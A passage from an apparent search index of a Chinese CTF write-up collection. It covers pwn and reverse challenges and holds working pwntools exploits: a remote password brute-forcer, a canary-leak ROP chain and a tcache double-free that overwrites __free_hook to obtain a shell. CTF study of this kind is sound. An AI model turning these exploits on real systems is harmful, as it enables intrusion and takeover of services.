log_level = 'critical' table = list ( string . printable ) current = '' while ( True ): #p = process('./login') p = remote ( '119.23.206.23' , 10002 ) p . recvuntil ( 'What your name? \\n ' ) p . sendline ( 'hgy' ) for i in table : tmp = current + i p . recvuntil ( 'Your password :' ) p . send ( tmp ) res = p . recvline () if \"Welcome\" in res : current += i print current p . close () break p . interactive ()","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Pwn/#noflag","text":"","title":"noflag"},{"location":"WriteUp/201905/Pwn/#_5","text":"\u6808\u6ea2\u51fa canary \u7ed5\u8fc7 rop","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Pwn/#_6","text":"\u5728 main \u51fd\u6570\u4e2d\u5b58\u5728\u4e24\u6b21\u8f93\u5165\uff0c\u7b2c\u4e00\u6b21\u8f93\u51fa\u4f1a\u88ab\u91cd\u65b0\u6253\u5370\u51fa\u6765\u3002 \u56e0\u4e3a\u4f7f\u7528\u7684 read \u63a5\u53d7\u7684\u8f93\u5165\uff0c\u6240\u4ee5\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\u4e0d\u4f1a\u6dfb\u52a0'\\0'\uff0c\u90a3\u4e48\u5728\u8f93\u51fa\u65f6\u5c31\u4e0d\u4f1a\u622a\u65ad\uff0c\u7531\u6b64\u53ef\u4ee5\u4e00\u6b21\u6027\u6cc4\u9732\u51fa\u6808\u4e0a\u7684 canary \u548c\u7a0b\u5e8f\u6bb5\u5730\u5740\u3002 \u53ea\u8981\u8f93\u5165 0x29 \u4e2a'a',\u5c31\u80fd\u6070\u597d\u8986\u76d6\u6389 canary \u6700\u4f4e\u4f4d\u7684'\\x00'\uff0c\u7136\u540e\u5f53\u7a0b\u5e8f\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u6210\u529f\u6cc4\u9732\u51fa canary \u4ee5\u53ca\u5b83\u540e\u9762\u7684\u4e00\u4e2a\u4ee3\u7801\u6bb5\u7684\u5730\u5740\u3002\u8be5\u4ee3\u7801\u6bb5\u5730\u5740\u4e0e\u4ee3\u7801\u6bb5\u57fa\u5740\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u504f\u79fb\uff0c\u51cf\u53bb\u8be5\u504f\u79fb\u65e2\u53ef\u83b7\u5f97\u57fa\u5740\u3002\u5230\u6b64\uff0c\u4e5f\u5c31\u540c\u65f6\u7ed5\u8fc7\u4e86 pie \u548c canary\u3002 \u7136\u540e\u7a0b\u5e8f\u4f1a\u63a5\u53d7\u7b2c\u4e8c\u6b21\u8f93\u5165\uff0c\u8fd9\u6b21\u8f93\u5165\u5c31\u9700\u8981\u4fee\u590d\u521a\u521a\u88ab\u4fee\u6539\u6389\u6700\u540e\u4e00\u5b57\u8282\u7684 canary\uff0c\u540c\u65f6\u5c06\u8fd4\u56de\u5730\u5740\u4fee\u6539\u4e3a main \u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e8c\u6b21\u5229\u7528\u6f0f\u6d1e\u4e86 \u5728\u7b2c\u4e8c\u6b21\u6267\u884c main \u51fd\u6570\u4e2d\uff0c\u5728\u8f93\u5165\u65f6\u8f93\u5165 0xc0 \u4e2a'a'\uff0c\u5c31\u53ef\u4ee5\u6cc4\u9732\u51fa\u4e00\u4e2a\u4f4d\u4e8e ld \u4e2d\u7684\u5730\u5740\uff0c\u6539\u5730\u5740\u5230 libc \u57fa\u5740\u7684\u504f\u79fb\u56fa\u5b9a\uff0c\u6240\u4ee5\u7531\u6b64\u53ef\u4ee5\u6cc4\u9732\u51fa libc \u7684\u57fa\u5740\u3002 \u5728\u7b2c\u4e8c\u6b21\u8f93\u5165\u65f6\uff0c\u7531\u4e8e\u6cc4\u9732\u51fa\u4e86 libc \u57fa\u5740\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7 rop \u4e3a\u6240\u6b32\u4e3a\u4e86 2333\u3002\u8fd9\u91cc exp \u662f\u7528\u7684 one_gadget\uff0c\u56e0\u4e3a\u4e8b\u5148\u5df2\u7ecf\u901a\u8fc7 rop \u6cc4\u9732\u51fa\u7684\u51fd\u6570\u5730\u5740\u5f97\u5230\u4e86\u8fdc\u7a0b\u7684 libc \u7248\u672c\u4e3a 2.23(rop \u4ee3\u7801\u5c31\u4e0d\u7ed9\u51fa\u4e86)\u3002 from pwn import * p = process ( './noflag' ) p . recvuntil ( 'length of name: \\n ' ) p . sendline ( str ( 0x29 )) p . recvuntil ( 'name: \\n ' ) p . send ( 'a' * 0x29 ) p . recvuntil ( 'a' * 0x28 ) canary = u64 ( p . recvn ( 8 )) / 0x100 * 0x100 pie = u64 ( p . recvuntil ( 'l' )[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0xe10 print \"canary: %#x \" % canary print \"pie: %#x \" % pie main = pie + 0xd21 p . recvuntil ( 'of introduction: \\n ' ) p . sendline ( str ( 0x40 )) p . recvuntil ( 'introduction: \\n ' ) p . send ( 'a' * 0x28 + p64 ( canary ) + p64 ( 0xdeadbeef ) + p64 ( main )) p . recvuntil ( 'length of name: \\n ' ) p . sendline ( str ( 0xc0 )) p . recvuntil ( 'name: \\n ' ) p . send ( 'a' * 0xc0 ) p . recvuntil ( 'a' * 0xc0 ) libc_base = u64 ( p . recvuntil ( 'l' )[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0x3da7cb print \"libc_base: %#x \" % libc_base one_gadget = libc_base + 0x4526a payload = 'a' * 0x28 + p64 ( canary ) + p64 ( 0xdeadbeef ) + p64 ( one_gadget ) payload = payload . ljust ( 0xc0 , ' \\x00 ' ) p . recvuntil ( 'of introduction: \\n ' ) p . sendline ( str ( 0xc0 )) p . recvuntil ( 'introduction: \\n ' ) p . send ( payload ) p . interactive () \u7136\u800c\u8fd9\u9898\u4e0d\u6b62\u4e00\u4e2a\u89e3\uff0c\u53ef\u4ee5\u4e0d\u7528\u6cc4\u9732 libc\uff0c\u901a\u8fc7\u6784\u9020 rop \u8c03\u7528 fopen \u548c fscanf \u6765\u8bfb\u53d6 flag \u4e5f\u884c\uff0c\u4e0d\u8fc7\u5c31\u9ebb\u70e6\u4e86\u8bb8\u591a\u3002","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Pwn/#club","text":"","title":"club"},{"location":"WriteUp/201905/Pwn/#_7","text":"\u901a\u8fc7\u5199\u6cc4\u9732\u5806\u5730\u5740\u63a8\u6d4b libc \u7248\u672c fastbin attack \u901a\u8fc7 unsorted bin \u6cc4\u9732 libc tcache \u5229\u7528","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Pwn/#_8","text":"\u68c0\u67e5\u9898\u76ee\u4fdd\u62a4\uff0c\u53d1\u73b0\u4fdd\u62a4\u5168\u5f00 \u9996\u5148\u8fde\u7eed\u6dfb\u52a0\u591a\u4e2a member\uff0c\u7136\u540e\u518d\u4f9d\u6b21\u91ca\u653e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e8c\u4e2a member\uff0c\u4f7f\u5f97\u7b2c\u4e8c\u4e2a chunk \u7684 fd \u6307\u5411\u4e86\u7b2c\u4e00\u4e2a chunk \u7684\u5730\u5740\u3002\u518d\u6b21\u5c06\u7b2c\u4e8c\u4e2a chunk \u5206\u914d\u51fa\u6765\uff0cname \u8bbe\u7f6e\u4e3a'b'\uff0c\u8fd9\u53ea\u4f1a\u4fee\u6539\u6389\u5806\u5730\u5740\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u901a\u8fc7 edit(1, 'b')\u8f93\u51fa\u8be5 chunk \u7684 fd\u3002\u53ef\u4ee5\u53d1\u73b0\uff0c\u5730\u5740\u7684\u7b2c 3 \u4f4d\u4e0d\u4e3a 0\uff0c\u800c\u662f 2\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5806\u4e0a\u4e8b\u5148\u5206\u914d\u4e86\u4e00\u4e2a 0x200 \u5927\u5c0f\u4ee5\u4e0a\u7684 chunk\uff0c\u8054\u7cfb\u5230 libc2.27 \u4ee5\u4e0a\u4f1a\u5728\u5806\u4e0a\u5f00\u8f9f\u4e00\u4e2a 0x250 \u5927\u5c0f\u7684\u7a7a\u95f4\u7528\u4e8e\u7ba1\u7406 tcache\uff0c\u4ece\u800c\u786e\u5b9a\u6587\u4ef6\u73af\u5883\u662f\u5b58\u5728 tcache \u7684\u3002 \u89c2\u5bdf\u5230\u6bcf\u6b21 remove \u90fd\u4f1a\u6e05\u7a7a name\uff0c\u4f46\u662f\u5f53\u6211 remove \u65f6\u53ea\u8f93\u5165\u56de\u8f66\uff0c\u5c31\u4f1a\u5bfc\u81f4'\\0'\u4e0e'\\0'\u6bd4\u8f83\uff0c\u4ece\u800c\u4f7f\u5df2\u7ecf free \u7684\u5806\u5757\u518d\u6b21\u88ab\u91ca\u653e\uff0c\u9020\u6210 double free\u3002\u7531\u56e0\u4e3a\u5177\u6709 tcache\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5728\u4efb\u610f\u5730\u5740\u5206\u914d chunk\u3002 \u4e3a\u4e86\u6cc4\u9732 libc \u7684\u57fa\u5740\uff0c\u5148\u901a\u8fc7 double free\uff0c\u5728\u5806\u4e0a\u5206\u914d\u4e00\u4e2a\u9519\u4f4d\u4e86 chunk\uff0c\u4ece\u800c\u53ef\u4ee5\u4fee\u6539\u6389\u4e00\u4e2a\u6b63\u5e38\u5806\u5757 victim \u7684 size\uff0c\u5c06 size \u4fee\u6539\u4e3a 0xc1\uff0c\u4f7f\u5176\u53d8\u6210\u4e00\u4e2a smallchunk\uff0c\u7136\u540e\u91ca\u653e\u6389 victim\uff0c\u5c31\u53ef\u4ee5\u5728 fd \u548c bk \u7684\u4f4d\u7f6e\u83b7\u5f97 libc \u4e2d\u7684\u5730\u5740\u3002\u518d\u6b21\u5c06\u8be5\u5904\u5185\u5b58\u5206\u914d\u51fa\u6765\uff0c\u5c31\u53ef\u4ee5\u6cc4\u9732\u51fa libc \u7684\u5730\u5740\u4e86\u3002 \u901a\u8fc7 double free \u5728__free_hook \u5904\u5206\u914d chunk\uff0c\u7136\u540e\u5199\u5165 libc2.27 \u7684 one_gadget \u7684\u5730\u5740\u6210\u529f getshell from pwn import * context . log_level = 'debug' p = process ( \"./contact\" ) libc = ELF ( './libc.so.6' ) #libc\u7248\u672c\u4e3a2.27 def add ( name , description ): p . recvuntil ( '> ' ) p . sendline ( '1' ) p . recvuntil ( 'name: ' ) p . sendline ( name ) p . recvuntil ( 'description(max 0x29bytes): \\n ' ) p . send ( description ) def remove ( name ): p . recvuntil ( '> ' ) p . sendline ( '2' ) p . recvuntil ( 'name of member: \\n ' ) p . sendline ( name ) def edit ( idx , description ): p . recvuntil ( '> ' ) p . sendline ( '3' ) p . recvuntil ( 'number of member: \\n ' ) p . sendline ( str ( idx )) p . recvuntil ( 'new description: \\n ' ) p . send ( description ) add ( 'a' , 'a' ) add ( 'b' , 'b' ) add ( 'c' , 'c' ) add ( 'd' , 'd' ) add ( 'e' , 'e' ) add ( 'x' , 'x' ) add ( 'x' , 'x' ) remove ( 'x' ) remove ( 'x' ) remove ( 'a' ) remove ( '' ) add ( 'a' , 'a' ) edit ( 0 , 'a' ) p . recvuntil ( 'a: ' ) heap_base = u64 ( p . recvline ()[: - 1 ] . ljust ( 8 , ' \\x00 ' )) / 0x1000 * 0x1000 + 0x250 print \"heap_base: %#x \" % heap_base payload = p64 ( heap_base + 0x30 ) edit ( 0 , payload ) add ( 'f' , 'f' ) payload = p64 ( 0 ) * 3 + p64 ( 0xc1 ) add ( 'g' , payload ) remove ( 'b' ) for _ in range ( 7 ): remove ( '' ) add ( 'b' , 'b' ) edit ( 1 , 'a' * 8 ) p . recvuntil ( 'b: aaaaaaaa' ) libc_base = u64 ( p . recvline ()[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0x3ebd50 free_hook = libc_base + libc . symbols [ '__free_hook' ] one_gadget = libc_base + 0x4f322 print \"libc_base: %#x \" % libc_base print \"free_hook: %#x \" % free_hook edit ( 1 , p64 ( 0 )) remove ( 'a' ) remove ( '' ) add ( 'a' , p64 ( free_hook )) add ( 't' , '/bin/sh \\x00 ' ) add ( 'p' , p64 ( one_gadget )) remove ( 't' ) p . interactive ()","title":"\u89e3\u9898\u601d\u8def"},{"location":"WriteUp/201905/Reverse/","text":"REVERSE \u00b6 baby \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u6590\u6ce2\u90a3\u5951\u6570\u5217 \u7b80\u5355\u7684\u5f02\u6216\u52a0\u5bc6 \u89e3\u9898\u601d\u8def \u00b6 \u4e3b\u8981\u662f\u63d0\u53d6\u51fa key\uff0c\u7136\u540e\u5f02\u6216\u56de\u53bb\u5c31\u5b8c\u4e8b\u4e86\u3002 table = [ 0x64 , 0x6f , 0x64 , 0x6f , 0x76 , 0x2c , 0x13 , 0x41 , 0x6a , 0xcf , 0x9c , 0x26 , 0x1b , 0xeb , 0x48 , 0x6a , 0xa , 0x2b , 0xf3 , 0x5c , 0x83 , 0x54 , 0x4e , 0x77 , 0x2e , 0x47 , 0x8c , 0x55 ] def fibbo ( n ): a , b = 0 , 1 for i in range ( n ): a , b = b , a + b return a for i , val in enumerate ( table ): print ( chr (( val ^ fibbo ( i + 3 )) & 0xff ), end = '' ) baby(dondayoo~\u6218\u961f wp) \u00b6 Windows \u7a0b\u5e8f\uff0c\u5148\u8fd0\u884c\u770b\u770b \u4e71\u8f93\u4e00\u4e2a\uff0c\u76f4\u63a5\u9000\u51fa\u3002\u7136\u540e\u653e\u8fdb IDA \u91cc\u5206\u6790 \u770b\u5230\u8fd9\u91cc\u6ca1\u6709 main \u51fd\u6570\uff0c\u641c\u7d22\u4e00\u4e0b\u5b57\u7b26\u4e32 Input \u70b9\u5f00 401030 \u51fd\u6570\uff0cF5 \u53cd\u6c47\u7f16\uff0c\u786e\u5b9a\u8fd9\u4e2a\u662f main \u51fd\u6570 \u8fd9\u6bb5\u4ee3\u7801\u53ef\u4ee5\u76f4\u63a5\u770b\u61c2\uff0c401180 \u548c 401130 \u5206\u522b\u662f printf \u548c scanf\uff0c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a 30 \u63a5\u4e0b\u6765 while \u5faa\u73af\u91cc\u505a\u4e86\u4e00\u4e2a\u5f02\u6216\u64cd\u4f5c\uff0c\u518d\u5224\u65ad\u662f\u5426\u548c\u5185\u5b58\u4e2d\u7684\u6570\u636e\u76f8\u7b49\uff0c\u76f8\u7b49\u5219\u8f93\u5165\u6b63\u786e \u53d8\u91cf v3 \u662f\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0cv4 \u662f 401000 \u751f\u6210\u7684\u4e00\u4e2a\u6570\u636e\uff0c\u8fdb\u5165 401000 \u5206\u6790 \u8fd9\u662f\u4e00\u4e2a\u9012\u5f52\u51fd\u6570 \u4e00\u5f00\u59cb\u6ca1\u770b\u660e\u767d\u662f\u505a\u4ec0\u4e48\u7528\u7684\uff0c\u7528 python \u5bf9\u7167\u7740\u5199\u4e86\u4e00\u4e0b \u5f88\u660e\u663e\uff0c\u51fd\u6570\u8fd4\u56de\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7b2c n \u4e2a\u503c \u6240\u4ee5\u76ee\u6807\u5c31\u662f\u8ba9\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u548c\u6590\u6ce2\u90a3\u5951\u6570\u5217\u8fdb\u884c\u5f02\u6216\u7684\u503c\u4e0e byte_41C7D4 \u76f8\u7b49 \u628a\u8fd9\u6bb5\u6570\u636e dump \u51fa\u6765\uff0c\u7f16\u5199 python \u811a\u672c from libnum import n2s def func ( num ): v1 = num if ( num == 0 or num == 1 ): return num v2 = func ( num - 2 ) return ( v2 + func ( v1 - 1 )) & 2 ** 8 - 1 arr = [] for i in range ( 30 ): arr . append ( func ( i + 3 )) c = '71 60 70 6B 79 73 59 0E 68 E6 DA 26 17 84 44 28 20 1F 9D 69 C0 53 63 45 1D 35 D9 1C E4 78' . split ( ' ' ) c = list ( map ( lambda x : int ( '0x' + x , 16 ), c )) flag = '' print ( arr , c ) for i in range ( 30 ) : flag += ( n2s ( arr [ i ] ^ c [ i ])) print ( flag ) showme666 \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u6c47\u7f16\u7406\u89e3 gdb \u8c03\u8bd5 patch \u89e3\u9898\u601d\u8def \u00b6 \u8fd9\u9053\u9898\u89e3\u9898\u601d\u8def\u4e0d\u552f\u4e00 \u6700\u7b80\u5355\u7684\u662f\u7528 gdb \u8c03\u8bd5\u65f6\uff0c\u4fee\u6539 rip \u5230 0x4006b6\uff0c\u7136\u540e\u7ee7\u7eed\u8fd0\u884c\uff0c\u5c31\u53ef\u8f93\u51fa flag \u7136\u540e\u7ee7\u7eed\u8fd0\u884c\u5373\u53ef showme666(dondayoo~\u6218\u961f wp) \u00b6 \u5148\u8fd0\u884c\u7a0b\u5e8f\u770b\u770b \u662f\u4e00\u4e2a\u63b7\u9ab0\u5b50\u7a0b\u5e8f\uff0c\u5fc5\u987b 5 \u4e2a\u90fd\u662f 6 \u70b9\u624d\u80fd\u901a\u8fc7\uff0c\u5206\u6790\u7a0b\u5e8f\u7c7b\u578b 64 \u4f4d ELF \u7a0b\u5e8f\uff0c\u7528 IDA64 \u6253\u5f00 \u968f\u673a\u6570\u662f\u7528\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\u751f\u6210\uff0c\u4e0d\u53ef\u63a7\u5236 \u800c\u4e14\u8fd8\u6709\u53cd\u4f5c\u5f0a\u673a\u5236\uff0c666 \u8fd9\u4e00\u6bb5\u662f\u6700\u7ec8\u7ed3\u679c\u90e8\u5206\uff0c\u5982\u679c\u63b7\u51fa 5 \u4e2a 6 \u70b9\uff0c\u4f1a\u8c03\u7528 4006B6 \u51fd\u6570\uff0c\u8fdb\u5165\u51fd\u6570\u67e5\u770b \u5176\u4e2d\u6709 putchar\uff0c\u8bf4\u660e\u8be5\u51fd\u6570\u4f1a\u8f93\u5165\u5b57\u7b26\uff0c\u5e94\u8be5\u5c31\u662f\u8f93\u51fa flag\u3002\u6700\u91cd\u8981\u7684\u662f\u8be5\u51fd\u6570\u6ca1\u6709\u53c2\u6570\u4f20\u5165\uff0c\u6240\u4ee5\u53ea\u8981\u52a8\u6001\u8c03\u8bd5\u76f4\u63a5\u5c06\u51fd\u6570\u5730\u5740\u4f5c\u4e3a IP \u5c31\u80fd\u591f\u6267\u884c\u8be5\u51fd\u6570 \u4e00\u8def\u6267\u884c\u5230\u5e95\uff0c\u8f93\u51fa\u4e86 flag \u8981\u628a flag \u6362\u6210 scuctf rcrcrc \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u7b97\u6cd5\u5206\u6790 python \u811a\u672c\u7f16\u5199 \u89e3\u9898\u601d\u8def \u00b6 \u8fd9\u9898\u4e3b\u8981\u8003\u5bdf\u9006\u5411\u5206\u6790\u80fd\u529b\uff08\u7eb8\u4e0a\u6253\u4e2a\u8349\u7a3f\uff0c\u4ee3\u7801\u9006\u7740\u5199\u5c31\u884c\u4e86 \u89e3\u9898\u811a\u672c\u5982\u4e0b(C \u8bed\u8a00) #include <stdio.h> unsigned int key [] = { 0xF4A956BF , 0xBA568F3D , 0xD73A7F7C , 0x817F532B }; unsigned int T [] = { 0xd24aaa79 , 0x0bf82ac7 , 0x6d08584c , 0x4b7703cf , 0xeb5a5436 , 0x04fc4110 , 0x07a6c88e , 0xcce3bc69 , 0x67b581db , 0x42958bd7 , 0xfde60589 , 0xfbc21664 , 0x56fc110f , 0x224189f6 , 0x0da07f95 , 0xfb0506e6 , 0x1b02b4d0 , 0x4c263256 , 0x1bf60164 , 0x79ad7531 , 0xe0fa6867 , 0xe06b6073 , 0xd63b49ce , 0xa5d0d5fe , 0x89713ab9 , 0x3258490d }; unsigned int func ( unsigned int a , unsigned int b ) { return (( a >> ( b & 0x1f )) | ( a << ( 32 - b & 0x1f ))) & 0xffffffff ; } int main () { int i , j ; for ( i = 2 ; i >= 0 ; i -= 2 ) { unsigned int a = key [ i ]; unsigned int b = key [ i + 1 ]; for ( j = 11 ; j >= 0 ; j -- ) { b -= T [ 2 * i + 1 ]; b = func ( b , a ) ^ a ; a -= T [ 2 * i ]; a = func ( a , b ) ^ b ; } key [ i ] = a - 0xd24aaa79 ; key [ i + 1 ] = b - 0x0bf82ac7 ; } printf ( \"%s\" , key ); } rcrcrc(dondayoo~\u6218\u961f wp) \u00b6 Linux \u7a0b\u5e8f\uff0c\u5148\u8fd0\u884c\u770b\u770b \u7a0b\u5e8f\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\uff0c\u968f\u4fbf\u8f93\u5165\u5b57\u7b26\uff0c\u7a0b\u5e8f\u9000\u51fa\uff0cIDA64 \u6253\u5f00\u5206\u6790 main \u51fd\u6570\u4e2d\u6709 scanf \u548c\u51e0\u4e2a\u53d8\u91cf\u5b9a\u4e49\uff0c\u6700\u7ec8\u5224\u65ad\u56db\u4e2a\u53d8\u91cf\u503c\u662f\u5426\u6b63\u786e \u5148\u8fdb\u5165 400894 \u67e5\u770b \u5176\u4e2d ROL \u548c\u90e8\u5206\u53d8\u91cf\u7684\u540d\u5b57\u662f\u6211\u81ea\u5df1\u4fee\u6539\u8fc7\u7684\uff0c\u70b9\u5f00 ROL \u5f88\u5bb9\u6613\u5206\u6790\u51fa\u8fd9\u662f\u5faa\u73af\u5de6\u79fb\u51fd\u6570 \u770b\u5230 \u8fd9\u6837\u7684\u7ed3\u6784\uff0c\u518d\u7ed3\u5408\u9898\u76ee\u540d\u5b57\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f\u4e00\u4e2a RC5 \u52a0\u5bc6\u7a0b\u5e8f\uff0c\u518d\u8fdb\u5165 4006FC \u67e5\u770b \u53ef\u4ee5\u786e\u5b9a\u662f RC5 \u52a0\u5bc6\uff0c\u4e00\u4e2a\u5206\u7ec4\u662f int\uff0c\u4e5f\u5c31\u662f 32 \u4f4d\uff0c\u505a 12 \u8f6e\u5faa\u73af\uff0c400894 \u662f\u5bc6\u94a5\u6269\u5c55\u51fd\u6570\uff0c4006FC \u662f\u52a0\u5bc6\u51fd\u6570\uff0c\u9644\u4e24\u9875 ppt \u4f46\u4e0e\u4e00\u822c\u7684 RC5 \u4e0d\u540c\u7684\u662f\uff0c\u7a0b\u5e8f\u6bcf\u4e00\u8f6e\u4f7f\u7528\u7684\u5b50\u5bc6\u94a5\u662f\u4e00\u6837\u7684 \u5faa\u73af\u53d8\u91cf j \u4f5c\u4e3a\u5bc6\u94a5\u6570\u7ec4\u7d22\u5f15\uff0c\u6ca1\u6709\u4fee\u6539 \u8981\u8fdb\u884c\u89e3\u5bc6\uff0c\u9996\u5148\u8981\u83b7\u5f97\u4f7f\u7528\u7684\u5b50\u5bc6\u94a5\uff0c\u5728\u8fd9\u91cc\u65e0\u9700\u5bf9\u5bc6\u94a5\u6269\u5c55\u51fd\u6570\u8fdb\u884c\u5206\u6790\uff0c\u76f4\u63a5\u5728\u52a8\u6001\u8c03\u8bd5\u4e2d\u4ece\u5185\u5b58 dump \u51fa\u5404\u4e2a\u5b50\u5bc6\u94a5\u5373\u53ef \u53ef\u4ee5\u5f97\u5230 4 \u4e2a\u5b50\u5bc6\u94a5 0xd24aaa79,0x0bf82ac7,0xeb5a5436,0x04fc4110 \u6309\u7167\u5bc6\u94a5\u7684\u4f7f\u7528\u987a\u5e8f\uff0c\u7f16\u5199\u89e3\u5bc6\u7a0b\u5e8f import libnum def ror ( num , d ): tmp = num >> ( d & 0x1f ) return tmp | (( num << ( 32 - ( d & 0x1f ))) & 2 ** 32 - 1 ) s = [ 0xd24aaa79 , 0x0bf82ac7 , 0xeb5a5436 , 0x04fc4110 ] cipher = [ 0xf4a956bf , 0xba568f3d , 0xd73a7f7c , 0x817f532b ] message = [] for r in range ( 0 , 3 , 2 ): ld = cipher [ r ] rd = cipher [ r + 1 ] for rnd in range ( 12 ): rd = ror (( rd - s [ r + 1 ]) & 2 ** 32 - 1 , ld ) ^ ld ld = ror (( ld - s [ r ]) & 2 ** 32 - 1 , rd ) ^ rd rd = ( rd - s [ 1 ]) & 2 ** 32 - 1 ld = ( ld - s [ 0 ]) & 2 ** 32 - 1 message . append ( libnum . n2s ( ld )) message . append ( libnum . n2s ( rd )) print ( message ) \u8fd0\u884c\u5f97\u5230 \u4f3c\u4e4e\u4e0d\u662f\u53ef\u8bfb\u7684\u5b57\u7b26\u4e32\uff0c\u4f46\u786e\u5b9e\u90fd\u843d\u5728 ASCII \u8303\u56f4\u5185\uff0c\u770b\u4e86\u534a\u5929\uff0c\u6ce8\u610f\u5230 linux \u662f\u5c0f\u7aef\u4f4d\u5e8f\uff0c\u8fd9\u4e2a\u7ed3\u679c\u4e5f\u662f\u5c0f\u7aef\u65b9\u5f0f\u8f93\u51fa\u7684\uff0c\u5b9e\u9645 flag \u5e94\u8be5\u5012\u8fc7\u6765 rc5_fking_boring baha \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 base64 \u7b97\u6cd5\u9006\u5411 \u7206\u7834\u54c8\u5e0c\u7b97\u6cd5 \u89e3\u9898\u601d\u8def \u00b6 \u9996\u5148\u9006\u5411 base64\uff0c\u4f7f\u7528\u968f\u673a\u6570\u6253\u4e71\u4e86\u539f\u59cb\u7d22\u5f15\u8868\uff0c\u4f46\u662f\u968f\u673a\u6570\u7ed3\u679c\u4f7f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u751f\u6210\u7684\u65b0\u7d22\u5f15\u8868\u4e5f\u56fa\u5b9a\u3002 base64 \u89e3\u5bc6\u811a\u672c\u5982\u4e0b\uff1a key = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' T = 'kEjTmtB3VtHvgs51kl5v' b = '' for i in T : if i == '=' : b += '000000' break tmp = key . find ( i ) tmp = bin ( tmp )[ 2 :] if not len ( tmp ) == 0 : if len ( tmp ) < 6 : for _ in range ( 6 - len ( tmp )): b += '0' b += tmp j = 0 for i in range ( 0 , len ( b ), 8 ): print ( chr ( int ( b [ i : i + 8 ], 2 )), end = '' ) j += 1 \u7136\u540e\u662f\u7206\u7834\u8f93\u5165\u4e3a 9 \u4f4d\u6570\u5b57\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u5927\u4f6c\u4eec\u592a\u5f3a\u4e86\uff0c\u76f4\u63a5\u628a\u51fd\u6570\u590d\u539f\u4e86\uff0c\u9884\u671f\u89e3\u5982\u4e0b //#include \"stdafx.h\" #include <windows.h> #include <stdio.h> typedef __int64 ( * func )(); int main () { //char * hmod = (char *)LoadLibraryA(\"C:\\\\Users\\\\hgy\\\\Desktop\\\\hxb\\\\reverse_1\\\\reverse.exe\"); FILE * fp ; fp = fopen ( \"./baha.exe\" , \"rb\" ); size_t len = 0 ; fseek ( fp , 0 , SEEK_END ); len = ftell ( fp ); fseek ( fp , 0 , SEEK_SET ); char * hmod = ( char * ) VirtualAllocEx ( GetCurrentProcess (), 0 , len , MEM_COMMIT , PAGE_EXECUTE_READWRITE ); fread ( hmod , len , 1 , fp ); func hash = ( func ) & hmod [ 0x560 ]; unsigned long long res ; char flag [ 0x30 ] = \"b@sE2019_scucs_\" ; for ( flag [ 15 ] = '0' ; flag [ 15 ] < '0' + 10 ; flag [ 15 ] ++ ) for ( flag [ 16 ] = '0' ; flag [ 16 ] < '0' + 10 ; flag [ 16 ] ++ ) for ( flag [ 17 ] = '0' ; flag [ 17 ] < '0' + 10 ; flag [ 17 ] ++ ) for ( flag [ 18 ] = '0' ; flag [ 18 ] < '0' + 10 ; flag [ 18 ] ++ ) { for ( flag [ 19 ] = '0' ; flag [ 19 ] < '0' + 10 ; flag [ 19 ] ++ ) for ( flag [ 20 ] = '0' ; flag [ 20 ] < '0' + 10 ; flag [ 20 ] ++ ) for ( flag [ 21 ] = '0' ; flag [ 21 ] < '0' + 10 ; flag [ 21 ] ++ ) for ( flag [ 22 ] = '0' ; flag [ 22 ] < '0' + 10 ; flag [ 22 ] ++ ) for ( flag [ 23 ] = '0' ; flag [ 23 ] < '0' + 10 ; flag [ 23 ] ++ ) { unsigned int addr = ( unsigned int ) flag ; __asm { mov ecx , addr } res = hash (); if ( res == 0x8181433626e17720 ) { printf ( \"found: %s\" , flag ); exit ( 0 ); } } printf ( \"%s -- %#llx \\n \" , flag , res ); } return 0 ; } \u8fd9\u91cc\u6709\u4e2a\u5c0f\u5751\u662f\uff0c\u54c8\u5e0c\u51fd\u6570\u91c7\u7528_thiscall \u8c03\u7528\u7684\uff0c\u6240\u4ee5\u6211\u7528\u7684\u5185\u8054\u6c47\u7f16\u7ed9\u51fd\u6570\u4f20\u7684\u53c2\u6570\u3002\u4e0d\u8fc7\u5927\u4f6c\u4eec\u76f4\u63a5\u590d\u539f\u4e86\u51fd\u6570\uff0c\u4e5f\u5c31\u6ca1\u8fd9\u4e9b\u95ee\u9898\u4e86 2333. baha(dondayoo~\u6218\u961f wp) \u00b6 Windows \u7a0b\u5e8f\uff0c\u8fd0\u884c\u770b\u770b \u4e24\u6bb5\u8f93\u5165\uff0c\u6709\u9519\u8bef\u63d0\u793a\uff0cIDA \u6253\u5f00\u5206\u6790 \u6ca1\u6709 main \u7b26\u53f7\uff0c\u641c\u7d22\u5b57\u7b26\u4e32 Welcome \u8fdb\u5165 main \u51fd\u6570\u67e5\u770b 